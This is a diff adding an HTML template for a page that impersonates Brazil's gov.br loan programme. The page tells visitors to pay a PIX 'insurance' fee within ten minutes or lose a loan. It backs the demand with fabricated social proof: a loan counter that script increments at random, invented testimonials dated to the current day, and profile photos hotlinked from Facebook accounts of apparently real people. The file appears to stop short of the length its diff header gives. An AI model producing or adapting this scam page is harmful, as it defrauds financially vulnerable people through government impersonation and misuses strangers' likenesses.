@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script type="text/javascript"> (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, "clarity", "script", "qs9me5web3"); </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <title>PROGRAMA CRÉDITO DO TRABALHADOR - SEGURO</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-800.5c5f78761d00551b.woff2') }}") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            margin-top: 0;
+            padding-top: 100px;
+            font-family: 'Rawline', sans-serif;
+            max-width: 100%;
+            overflow-x: hidden;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            height: 35px;
+        }
+        .header-icons {
+            display: flex;
+            align-items: center;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #1351b4;
+            margin-left: 15px;
+            cursor: pointer;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .alert-box {
+            background-color: #fabc14;
+            color: #333;
+            padding: 1.2rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .alert-title {
+            display: flex;
+            align-items: center;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            font-size: 1.1rem;
+        }
+        .alert-title i {
+            color: #d61600;
+            margin-right: 8px;
+            font-size: 1.2rem;
+        }
+        .alert-title span {
+            color: #000;
+        }
+        .payment-card {
+            background-color: #1451B4;
+            color: white;
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+        }
+        .payment-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        .payment-header span {
+            font-weight: 700;
+            font-size: 1.3rem;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
+        }
+        .payment-header span i {
+            margin-right: 8px;
+        }
+        .user-info-content {
+            margin-top: 1rem;
+            padding: 1rem;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+        }
+        .user-info-item {
+            display: flex;
+            margin-bottom: 0.6rem;
+        }
+        .user-info-label {
+            color: rgba(255, 255, 255, 0.7);
+            width: 160px;
+            flex-shrink: 0;
+        }
+        .user-info-value {
+            color: white;
+            font-weight: 600;
+            flex-grow: 1;
+        }
+        .qr-container {
+            background-color: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+        .qr-code {
+            width: 220px;
+            height: 220px;
+            margin: 1rem auto;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .pix-code {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 1rem 0;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1px dashed #dee2e6;
+        }
+        .copy-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1351b4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 1rem 0;
+            transition: all 0.3s ease;
+        }
+        .copy-button:hover, .copy-button:active {
+            background-color: #092555;
+        }
+        .timer-container {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 1.2rem;
+            border-radius: 8px;
+            text-align: center;
+            margin: 1.5rem 0;
+            animation: pulse 2s infinite;
+        }
+        .timer {
+            font-size: 36px;
+            font-weight: 700;
+            color: #dc3545;
+            margin: 15px 0;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+        .warning-text {
+            font-weight: 600;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(220, 53, 69, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 53, 69, 0); }
+        }
+        .loading {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            margin: 2rem 0;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-top-color: #1351b4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 1rem;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0c326f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        .content {
+            display: none;
+        }
+        .footer {
+            background-color: #071D41;
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+            margin-top: 2rem;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 0.8rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img alt="Logo Gov.br" class="logo" src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-spinner"></div>
+        <p style="font-size: 18px; color: #333;">Gerando transação PIX...</p>
+    </div>
+
+    <!-- Main Content (initially hidden) -->
+    <div class="content" id="mainContent">
+        <div class="container">
+            <div class="alert-box">
+                <div class="alert-title" style="color: #000000; text-align: center; justify-content: center;">
+                    <i class="fas fa-exclamation-triangle" style="color: #000000;"></i>
+                    <span>ATENÇÃO</span>
+                </div>
+                <p>Para <strong>liberar o empréstimo</strong>, é necessário efetuar o pagamento do <strong>seguro prestamista</strong> conforme determinação do <strong>Conselho Monetário Nacional</strong> (Resolução Nº 3.308 do BCB).</p>
+                
+                <div style="margin: 15px 0; text-align: center;">
+                    <p style="font-weight: 700; font-size: 16px; margin-bottom: 5px;">TEMPO RESTANTE</p>
+                    <div class="timer" id="timer" style="font-size: 32px; font-weight: 700; color: #d61600; margin: 0 auto;">10:00</div>
+                </div>
+                
+                <p style="margin-top: 10px; font-weight: 500;">Se o pagamento do seguro não for realizado em até <strong>10 minutos</strong>, seu empréstimo será <strong>CANCELADO definitivamente</strong>. O benefício será repassado para outro cidadão e você perderá o direito ao empréstimo do Programa Crédito do Trabalhador.</p>
+            </div>
+
+            <div class="payment-card">
+                <div class="payment-header">
+                    <span><i class="fas fa-shield-alt"></i> SEGURO PRESTAMISTA</span>
+                </div>
+                
+                <!-- Dados do Pagamento -->
+                <div class="user-info-content" style="margin-top: 1rem; padding: 1rem; background-color: rgba(255, 255, 255, 0.1); border-radius: 5px;">
+                    <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 5px;">Nome:</div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 15px;">{{ nome }}</div>
+                    
+                    <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 5px;">CPF:</div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 15px;">{{ cpf }}</div>
+                    
+                    <div style="color: rgba(255, 255, 255, 0.7); margin-bottom: 5px;">Valor do Seguro:</div>
+                    <div style="color: white; font-weight: 600; margin-bottom: 5px;">R$ {{ "%.2f"|format(amount) }}</div>
+                </div>
+                
+                <p style="margin-top: 1.5rem; font-weight: 600; font-size: 1.1rem;">Este valor será devolvido após o término do seu contrato de empréstimo (36 meses).</p>
+                
+                <!-- Status de pagamento com loader -->
+                <div style="margin-top: 1.5rem; background-color: rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 1.2rem; text-align: center;">
+                    <p style="font-weight: 600; font-size: 1rem; margin-bottom: 10px;">Importante:</p>
+                    <p>Após o pagamento do seguro, seu empréstimo será liberado em até 24h úteis.</p>
+                    
+                    <!-- Loader animado e status -->
+                    <div style="margin: 15px auto; text-align: center;">
+                        <div class="loading-spinner" style="width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.3); border-radius: 50%; border-top: 4px solid white; margin: 0 auto; animation: spin 1s linear infinite;"></div>
+                        <p style="margin-top: 10px; font-weight: 700; color: white; letter-spacing: 1px;">AGUARDANDO PAGAMENTO</p>
+                    </div>
+                </div>
+                
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+            </div>
+
+            <!-- Contador de Empréstimos Liberados Hoje -->
+            <div class="qr-container" style="text-align: center; background-color: #1351b4; padding: 1.5rem; border-radius: 8px; margin-top: 1.5rem; width: 100%; max-width: 800px; margin-left: auto; margin-right: auto; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); position: relative; overflow: hidden;">
+                <!-- Efeito de brilho animado -->
+                <div style="position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: linear-gradient(45deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0) 100%); transform: rotate(45deg); animation: shine 3s infinite;">
+                </div>
+                <div class="flex flex-col items-center">
+                    <h3 style="font-weight: 700; font-size: 1.4rem; color: white; margin-bottom: 15px; text-align: center; text-transform: uppercase; letter-spacing: 1px; text-shadow: 1px 1px 3px rgba(0,0,0,0.2);">
+                        Empréstimos Liberados Hoje
+                    </h3>
+                    <div style="background-color: rgba(255,255,255,0.9); padding: 10px 30px; border-radius: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.2);">
+                        <p class="font-bold text-3xl" style="color: #1351b4; margin: 0;">
+                            <span id="loan-count" style="font-size: 36px;">8.632</span>
+                        </p>
+                    </div>
+                    <p style="color: rgba(255,255,255,0.8); margin-top: 10px; font-size: 0.9rem;">
+                        Atualizando em tempo real
+                    </p>
+                </div>
+                <style>
+                    @keyframes shine {
+                        0% {
+                            left: -100%;
+                        }
+                        100% {
+                            left: 100%;
+                        }
+                    }
+                </style>
+            </div>
+            
+            <!-- Seção de Comentários -->
+            <div class="qr-container" style="text-align: left; background-color: white; padding: 1.5rem; border-radius: 8px; margin-top: 1.5rem; width: 100%; max-width: 800px; margin-left: auto; margin-right: auto;">
+                <h3 style="font-weight: 700; font-size: 1.2rem; color: #1351b4; margin-bottom: 20px; text-align: center;">COMENTÁRIOS DOS BENEFICIADOS</h3>
+                
+                <div class="space-y-6">
+                    <!-- Comment 1 -->
+                    <div class="comment-card bg-white rounded-md p-4 border border-gray-200">
+                        <div class="mb-4">
+                            <p class="font-semibold">NOME: MARIA RODRIGUES</p>
+                            <p><strong>CPF:</strong> 647.***.***-00</p>
+                            <p><strong>VALOR LIBERADO:</strong> R$ 10.000,00</p>
+                            <p><strong>DATA DE SAQUE:</strong> <span class="saque-date"></span></p>
+                        </div>
+                        <div class="flex items-start mb-4">
+                            <img alt="Foto de perfil de Maria Rodrigues" class="w-12 h-12 rounded-full mr-4" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSwt37VMtjPsh4MQPEWJV3JYJaHRjbiavpm6w&s"/>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Maria Rodrigues</h3>
+                                <p class="text-gray-500"><span class="comment-date"></span></p>
+                            </div>
+                        </div>
+                        <p class="text-gray-700 mb-3">
+                            Gente, peguei 10 mil emprestado e vou da aquela reforma no meu salãozinho. Foi rapidinho sem aquela burocracia chata. Tô mega feliz! 😊👏
+                        </p>
+                        <img alt="Imagem de um salão de beleza reformado com cadeiras modernas e espelhos iluminados" class="comment-image w-full object-cover mb-3" src="https://i.ibb.co/rGdVKZZP/6-000-00-1.png"/>
+                        <div class="flex items-center space-x-4">
+                            <button class="like-button text-blue-500 hover:text-blue-700">
+                                <i class="fas fa-thumbs-up"></i>
+                            </button>
+                            <span class="text-gray-700">12</span>
+                            <button class="dislike-button text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-thumbs-down"></i>
+                            </button>
+                            <span class="text-gray-700">0</span>
+                            <button class="text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-reply"></i> Responder
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Comment 2 -->
+                    <div class="comment-card bg-white rounded-md p-4 border border-gray-200">
+                        <div class="mb-4">
+                            <p class="font-semibold">NOME: JOSEMIR DA SILVA</p>
+                            <p><strong>CPF:</strong> 987.***.***-54</p>
+                            <p><strong>VALOR LIBERADO:</strong> R$ 6.000,00</p>
+                            <p><strong>DATA DE SAQUE:</strong> <span class="saque-date"></span></p>
+                        </div>
+                        <div class="flex items-start mb-4">
+                            <img alt="Foto de perfil de João Silva" class="w-12 h-12 rounded-full mr-4" src="https://scontent.fbsb4-1.fna.fbcdn.net/v/t39.30808-6/484880652_1187735849596092_7271974838488681221_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeHLmMlVZRuFRjLT7n1QGwbWyAVFEb4SH4XIBUURvhIfhY4k0qYLw1T2NDs-llvB56umlU2MLbiVzpP-ySCO0IbC&_nc_ohc=nBXbGyZ64cAQ7kNvgEoVGNa&_nc_oc=AdnbwLbMvor9DW1fvZYZFlIJqhJWBDcFSDmPrh3ZE4ZFNfsBjOeJi98SagJO197NxE21VZSaAvDMDITstadikLpk&_nc_zt=23&_nc_ht=scontent.fbsb4-1.fna&_nc_gid=XRnIUE8pb31rYCEHbO5nBg&oh=00_AYGUIeiZl-LZKTZDBYhv93Bj-7tRO0zjJJrsTHO__mIVNQ&oe=67EB6511"/>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Josemir da Silva</h3>
+                                <p class="text-gray-500"><span class="comment-date"></span></p>
+                            </div>
+                        </div>
+                        <p class="text-gray-700 mb-3">
+                            Consegui 6 mil e vou investir no meu negocio de marmita fit! O dinheiro caiu na conta ma hora e nem acreditei. Agora é só lucro! 💪🍽️
+                        </p>
+                        <img alt="Imagem de uma microempresa de alimentos com prateleiras organizadas e produtos frescos" class="comment-image w-full object-cover mb-3" src="https://i.ibb.co/tMnzD0Js/6-000-00.png"/>
+                        <div class="flex items-center space-x-4">
+                            <button class="like-button text-blue-500 hover:text-blue-700">
+                                <i class="fas fa-thumbs-up"></i>
+                            </button>
+                            <span class="text-gray-700">8</span>
+                            <button class="dislike-button text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-thumbs-down"></i>
+                            </button>
+                            <span class="text-gray-700">0</span>
+                            <button class="text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-reply"></i> Responder
+                            </button>
+                        </div>
+                        <div class="mt-4 pl-8 border-l-2 border-gray-200">
+                            <p class="text-gray-700"><strong>Usuário:</strong> Como foi o processo para solicitar o empréstimo?</p>
+                            <p class="text-gray-700"><strong>Josemir:</strong> Foi super simples, fiz tudo pelo app e o dinheiro caiu na conta na hora!</p>
+                        </div>
+                    </div>
+
+                    <!-- Comment 3 -->
+                    <div class="comment-card bg-white rounded-md p-4 border border-gray-200">
+                        <div class="mb-4">
+                            <p class="font-semibold">NOME: JOANA PAULA FERREIRA</p>
+                            <p><strong>CPF:</strong> 426.***.***-14</p>
+                            <p><strong>VALOR LIBERADO:</strong> R$ 4.000,00</p>
+                            <p><strong>DATA DE SAQUE:</strong> <span class="saque-date"></span></p>
+                        </div>
+                        <div class="flex items-start mb-4">
+                            <img alt="Foto de perfil de Ana Paula Ferreira" class="w-12 h-12 rounded-full mr-4" src="https://scontent.fbsb4-1.fna.fbcdn.net/v/t1.6435-9/96024784_1201512053550680_3522603464599273472_n.jpg?_nc_cat=107&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeFU791MVAFDRAU5-OugOugBoyWGpSmMK6-jJYalKYwrr6rG30P-M8AaJGuEhv4kilVTxWLun8ktTHVT0frXyXE0&_nc_ohc=aIZh6tGf3IAQ7kNvgGyFLOm&_nc_oc=AdmpYYCBi6-o1aOxfBTTtW1aTAYeyEwBcWrFT__14CMF7QzOC-yUJ-5f7SA4I0iLAOc0HMpd4x1JbtG48fjI5Y9v&_nc_zt=23&_nc_ht=scontent.fbsb4-1.fna&_nc_gid=6jslPsjWEQt8ga06I-K6wQ&oh=00_AYGd8VP_USGgQyI_GLdsHcJWuG3hLwq1BawOT0JiJ7u1aw&oe=680CF200"/>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Joana Paula Ferreira</h3>
+                                <p class="text-gray-500"><span class="comment-date"></span></p>
+                            </div>
+                        </div>
+                        <p class="text-gray-700 mb-3">
+                            Peguei 4 mil emprestado. Foi super fácil pelo app e o dinheiro foi depositado na hora. recomendo muito
+                        </p>
+                        <img alt="Imagem de um ateliê de costura com máquinas modernas e tecidos coloridos" class="comment-image w-full object-cover mb-3" src="https://i.ibb.co/LzbKHdHd/6-000-00-2.png"/>
+                        <div class="flex items-center space-x-4">
+                            <button class="like-button text-blue-500 hover:text-blue-700">
+                                <i class="fas fa-thumbs-up"></i>
+                            </button>
+                            <span class="text-gray-700">15</span>
+                            <button class="dislike-button text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-thumbs-down"></i>
+                            </button>
+                            <span class="text-gray-700">0</span>
+                            <button class="text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-reply"></i> Responder
+                            </button>
+                        </div>
+                        <div class="mt-4 pl-8 border-l-2 border-gray-200">
+                            <p class="text-gray-700"><strong>Usuário:</strong> O dinheiro foi liberado no mesmo dia?</p>
+                            <p class="text-gray-700"><strong>Joana:</strong> Sim, foi liberado na hora, sem complicações!</p>
+                        </div>
+                    </div>
+
+                    <!-- Comment 4 -->
+                    <div class="comment-card bg-white rounded-md p-4 border border-gray-200">
+                        <div class="mb-4">
+                            <p class="font-semibold">NOME: CRISTINO FERREIRA ROSA</p>
+                            <p><strong>CPF:</strong> 789.***.***-11</p>
+                            <p><strong>VALOR LIBERADO:</strong> R$ 6.000,00</p>
+                            <p><strong>DATA DE SAQUE:</strong> <span class="saque-date"></span></p>
+                        </div>
+                        <div class="flex items-start mb-4">
+                            <img alt="Foto de perfil de Carlos Santos" class="w-12 h-12 rounded-full mr-4" src="https://scontent.fbsb4-1.fna.fbcdn.net/v/t39.30808-1/462284323_2075291336265954_7973076295083133055_n.jpg?stp=dst-jpg_s480x480_tt6&_nc_cat=104&ccb=1-7&_nc_sid=e99d92&_nc_eui2=AeFyLTGayXx-xDAdU6hOSuLMfxSX7Q0MYnh_FJftDQxieD7hyRuBVX_RgYK14Bbq4qhA3Hs47lRwZC-kc6LJao9h&_nc_ohc=P83BnESRPgUQ7kNvgFCCE3y&_nc_oc=AdlDPOW0a_4NnCQ_b8Lc-VvUJzpGvrrtPz-EeY7fzcN0aJQD3OKlDAkYv_141abDAx7XA0eoBQI9Nssyl-POcbyZ&_nc_zt=24&_nc_ht=scontent.fbsb4-1.fna&_nc_gid=FtSGEZp3ASJduKf80ZyZfQ&oh=00_AYEx7LyW5XpkMyh3-_6IpCaxw4tHOjgLrNljYnJ_d--xFQ&oe=67EB6BE9"/>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Cristino Ferreira Rosa</h3>
+                                <p class="text-gray-500"><span class="comment-date"></span></p>
+                            </div>
+                        </div>
+                        <p class="text-gray-700 mb-3">
+                            Solicitei 6 mil pra limpar umas dívidas e ainda vai sobrar pra dar um up no mercadinho. As parcelas tão bem baixas entao valeu muito a pena.
+                        </p>
+                        <img alt="Imagem de um pequeno mercado de bairro com prateleiras cheias de produtos" class="comment-image w-full object-cover mb-3" src="https://i.ibb.co/7dR7fPvf/6-000-00-3.png"/>
+                        <div class="flex items-center space-x-4">
+                            <button class="like-button text-blue-500 hover:text-blue-700">
+                                <i class="fas fa-thumbs-up"></i>
+                            </button>
+                            <span class="text-gray-700">20</span>
+                            <button class="dislike-button text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-thumbs-down"></i>
+                            </button>
+                            <span class="text-gray-700">0</span>
+                            <button class="text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-reply"></i> Responder
+                            </button>
+                        </div>
+                        <div class="mt-4 pl-8 border-l-2 border-gray-200">
+                            <p class="text-gray-700"><strong>Usuário:</strong> Quanto tempo demorou para aprovar o empréstimo?</p>
+                            <p class="text-gray-700"><strong>Cristino:</strong> Foi super rápido! Em menos de 1 hora já estava aprovado.</p>
+                        </div>
+                    </div>
+
+                    <!-- Comment 5 -->
+                    <div class="comment-card bg-white rounded-md p-4 border border-gray-200">
+                        <div class="mb-4">
+                            <p class="font-semibold">NOME: LUCIANA OLIVEIRA SANTOS</p>
+                            <p><strong>CPF:</strong> 351.***.***-77</p>
+                            <p><strong>VALOR LIBERADO:</strong> R$ 10.000,00</p>
+                            <p><strong>DATA DE SAQUE:</strong> <span class="saque-date"></span></p>
+                        </div>
+                        <div class="flex items-start mb-4">
+                            <img alt="Foto de perfil de Luciana Oliveira" class="w-12 h-12 rounded-full mr-4" src="https://scontent.fbsb20-1.fna.fbcdn.net/v/t39.30808-6/457361059_998152618677046_3428209825503547241_n.jpg?_nc_cat=103&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeHY_uE3390rnNpoXnqzudU0VVMbJxfNuUhVUxsnF825SO1gYI6LVGRMbgTzcvmjsYZHu6GP4Hc5sYVCdwbjCjjb&_nc_ohc=qi3aHsAWzwYQ7kNvgE69gJH&_nc_oc=Adnot3kBQXOtkOEwa4oMXot_caMtTi37sInPg79lk5QKrRsJSDZt_M-Bxa6n3nbe5M_08cpTthTM5NIiLRGaOUb4&_nc_zt=23&_nc_ht=scontent.fbsb20-1.fna&_nc_gid=nYILUsMMlNLtW1bzvZUtzw&oh=00_AYEtjtRsJdND5RcxQdrdhNPIYmvxg9QpkUHnFgfJjWOSiA&oe=67EB0580"/>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Luciana Oliveira</h3>
+                                <p class="text-gray-500"><span class="comment-date"></span></p>
+                            </div>
+                        </div>
+                        <p class="text-gray-700 mb-3">
+                            tô muito feliz! Peguei 10 mil e vou Compra uns equipamentos novos. Tudo certinho e rápido
+                        </p>
+                        <img alt="Imagem de marmitas saudáveis organizadas em recipientes prontos para entrega" class="comment-image w-full object-cover mb-3" src="https://i.ibb.co/bMStgFyX/6-000-00-5.png"/>
+                        <div class="flex items-center space-x-4">
+                            <button class="like-button text-blue-500 hover:text-blue-700">
+                                <i class="fas fa-thumbs-up"></i>
+                            </button>
+                            <span class="text-gray-700">18</span>
+                            <button class="dislike-button text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-thumbs-down"></i>
+                            </button>
+                            <span class="text-gray-700">0</span>
+                            <button class="text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-reply"></i> Responder
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Comment 6 -->
+                    <div class="comment-card bg-white rounded-md p-4 border border-gray-200">
+                        <div class="mb-4">
+                            <p class="font-semibold">NOME: GILBERTO MENDES LIMA</p>
+                            <p><strong>CPF:</strong> 654.***.***-97</p>
+                            <p><strong>VALOR LIBERADO:</strong> R$ 4.000,00</p>
+                            <p><strong>DATA DE SAQUE:</strong> <span class="saque-date"></span></p>
+                        </div>
+                        <div class="flex items-start mb-4">
+                            <img alt="Foto de perfil de Roberto Mendes" class="w-12 h-12 rounded-full mr-4" src="https://scontent.fbsb20-1.fna.fbcdn.net/v/t39.30808-6/301654193_621597359358422_7519562246326113456_n.jpg?_nc_cat=100&ccb=1-7&_nc_sid=6ee11a&_nc_eui2=AeGBi7pTq20vThlRKPMrq1uD1_K7vFh_pAbX8ru8WH-kBj3d8-XSTTBseVqbVo5i8Bs9KIPzX5F4gxYe0ZhWT8ij&_nc_ohc=YNIw-yXc9pwQ7kNvgFN8xmW&_nc_oc=AdktMoesqtwX03K9Rskp1wfVjlduYH3FZYUM6WGiwDsu8KOU2R6iVen3Wna1hs4uxmUdism4Sl2kgl9fl3uEWx-G&_nc_zt=23&_nc_ht=scontent.fbsb20-1.fna&_nc_gid=mx-P2kMgSpXQ69ydZcVfog&oh=00_AYExC1Esrnvk3DLnBUMouemLNrxoONcnT9ZQOuaRI7qCfQ&oe=67EB0230"/>
+                            <div>
+                                <h3 class="font-semibold text-gray-800">Gilberto Mendes Lima</h3>
+                                <p class="text-gray-500"><span class="comment-date"></span></p>
+                            </div>
+                        </div>
+                        <p class="text-gray-700 mb-3">
+                            Pedi 4 mil e chegou rapidinho no nubank. Tô até pensando em pegar mais sera que pode?
+                        </p>
+                        <img alt="Imagem de uma loja virtual com gráficos de vendas e produtos em destaque" class="comment-image w-full object-cover mb-3" src="https://i.ibb.co/DgpSHtZk/6-000-00-4.png"/>
+                        <div class="flex items-center space-x-4">
+                            <button class="like-button text-blue-500 hover:text-blue-700">
+                                <i class="fas fa-thumbs-up"></i>
+                            </button>
+                            <span class="text-gray-700">10</span>
+                            <button class="dislike-button text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-thumbs-down"></i>
+                            </button>
+                            <span class="text-gray-700">0</span>
+                            <button class="text-gray-500 hover:text-gray-700">
+                                <i class="fas fa-reply"></i> Responder
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <!-- Formulário para adicionar comentário -->
+                    <div class="bg-white rounded-md p-4 border border-gray-200 mt-6">
+                        <h4 class="font-bold text-gray-800 mb-3">Adicionar um comentário</h4>
+                        <form id="commentForm" class="space-y-3">
+                            <div>
+                                <textarea name="comment" id="commentText" rows="3" class="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Escreva seu comentário aqui..."></textarea>
+                            </div>
+                            <button type="submit" class="bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 transition duration-200">
+                                Publicar comentário
+                            </button>
+                        </form>
+                    </div>
+                </div>
+
+                <script>
+                    document.addEventListener("DOMContentLoaded", function () {
+                        // Incrementando contador de empréstimos
+                        const loanCountElement = document.getElementById("loan-count");
+                        let loanCount = 8632;
+
+                        function updateLoanCount() {
+                            loanCount += 1;
+                            loanCountElement.textContent = loanCount.toLocaleString("pt-BR");
+                            setTimeout(updateLoanCount, Math.random() * 2000 + 1000); // Intervalo aleatório entre 1 e 3 segundos
+                        }
+
+                        updateLoanCount();
+
+                        // Atualiza as datas dos comentários para a data atual
+                        const today = new Date().toLocaleDateString("pt-BR");
+                        const dateElements = document.querySelectorAll(".comment-date, .saque-date");
+                        dateElements.forEach(el => el.textContent = today);
+
+                        // Funcionalidade de curtir e descurtir
+                        const likeButtons = document.querySelectorAll(".like-button");
+                        likeButtons.forEach(button => {
+                            button.addEventListener("click", function () {
+                                const likeCount = this.nextElementSibling;
+                                likeCount.textContent = parseInt(likeCount.textContent) + 1;
+                            });
+                        });
+
+                        const dislikeButtons = document.querySelectorAll(".dislike-button");
+                        dislikeButtons.forEach(button => {
+                            button.addEventListener("click", function () {
+                                const dislikeCount = this.nextElementSibling;
+                                dislikeCount.textContent = parseInt(dislikeCount.textContent) + 1;
+                            });
+                        });
+
+                        // Formulário de comentário
+                        const commentForm = document.getElementById("commentForm");
+                        if (commentForm) {
+                            commentForm.addEventListener("submit", function(e) {
+                                e.preventDefault();
+                                const commentText = document.getElementById("commentText").value;
+                                if (commentText.trim() !== "") {
+                                    alert("Comentário enviado com sucesso! Seu comentário será analisado antes de ser publicado.");
+                                    document.getElementById("commentText").value = "";
+                                }
+                            });
+                        }
+                    });
+                </script>
+            </div>
+
